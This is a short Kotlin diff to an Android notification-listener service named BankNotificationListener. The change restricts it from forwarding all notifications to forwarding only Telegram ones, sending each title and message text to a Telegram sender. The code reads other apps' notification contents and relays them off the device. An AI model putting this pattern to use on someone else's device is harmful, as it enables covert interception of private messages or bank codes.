@@ -33,19 +33,22 @@ class BankNotificationListener : NotificationListenerService() {
         sbn ?: return
 
         val packageName = sbn.packageName
+
+        // Только Telegram
+        if (packageName != TELEGRAM_PACKAGE) return
+
         val notification = sbn.notification
         val extras = notification.extras
 
         val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: return
         val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
 
-        Log.d(TAG, "Notification from $packageName: $title - $text")
+        Log.d(TAG, "Telegram notification: $title - $text")
 
-        // Пересылаем все уведомления (для теста)
         scope.launch {
             try {
-                telegramSender.sendSimple("📱 <b>$packageName</b>\n\n<b>$title</b>\n$text")
-                Log.d(TAG, "Notification forwarded from: $packageName")
+                telegramSender.sendSimple("📩 <b>$title</b>\n\n$text")
+                Log.d(TAG, "Telegram notification forwarded")
             } catch (e: Exception) {
                 Log.e(TAG, "Error forwarding notification", e)
             }
